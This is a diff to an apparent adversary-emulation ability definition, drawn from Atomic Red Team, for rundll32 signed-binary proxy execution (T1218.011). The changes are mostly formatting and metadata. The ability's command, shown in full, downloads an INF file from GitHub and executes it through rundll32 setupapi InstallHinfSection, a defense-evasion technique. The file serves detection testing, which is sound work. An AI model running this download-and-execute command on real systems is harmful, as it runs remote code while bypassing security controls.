@@ -8,7 +8,7 @@
   tactic: stealth
   technique:
     attack_id: T1218.011
-    name: 'Signed Binary Proxy Execution: Rundll32'
+    name: 'System Binary Proxy Execution: Rundll32'
   platforms:
     windows:
       sh:
@@ -16,17 +16,18 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf") -ErrorAction
           ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf"
-          -OutFile "PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf";
-          fi; rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 "PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf"'
+          -OutFile "PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf"
+          -UseBasicParsing; fi; rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall
+          128 "PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf"'
   plugin: atomic
   singleton: false
   repeatable: true
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
-  - t1218.011
   - stealth
+  - t1218.011
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -45,9 +46,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf"
-        -OutFile "#{inf_to_execute}"
+        -OutFile "#{inf_to_execute}" -UseBasicParsing
 
         '
     technique_created: '2020-01-23T18:03:46.248Z'
     atomic_guid: 71d771cd-d6b3-4f34-bc76-a63d47a10b19
-    import_timestamp: '2026-10-20T07:08:26.296518Z'
+    import_timestamp: '2026-10-21T07:01:49.107439Z'
